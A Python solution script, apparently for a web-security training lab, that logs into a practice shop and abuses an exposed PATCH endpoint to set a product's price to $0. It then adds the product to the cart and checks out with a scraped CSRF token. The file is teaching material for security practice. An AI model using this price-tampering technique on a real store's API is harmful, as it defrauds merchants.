import sys
import os
sys.path.insert(0, os.path.join(os.path.dirname(__file__), "../.."))
from utils.base import LabSession

lab = LabSession()

# log in as wiener to get an authenticated session
lab.login("wiener", "peter")

# the product page fetches price data from /api/products/1/price
# an OPTIONS request reveals PATCH is allowed on this endpoint
# PATCH lets us set the price to whatever we want
lab.info("Setting jacket price to $0 via PATCH...")
resp = lab.session.patch(
    lab.url("/api/products/1/price"),
    json={"price": 0},
)

if resp.status_code == 200:
    lab.success(f"Price updated: {resp.text}")
else:
    lab.warn(f"PATCH failed (status {resp.status_code}): {resp.text}")

# add the jacket to cart and checkout
lab.info("Adding jacket to cart...")
lab.post("/cart", data={"productId": 1, "redir": "PRODUCT", "quantity": 1})

lab.info("Checking out...")
resp = lab.get("/cart")
from bs4 import BeautifulSoup
soup = BeautifulSoup(resp.text, "html.parser")
csrf = soup.find("input", {"name": "csrf"})["value"]
lab.post("/cart/checkout", data={"csrf": csrf})

lab.check_solved()
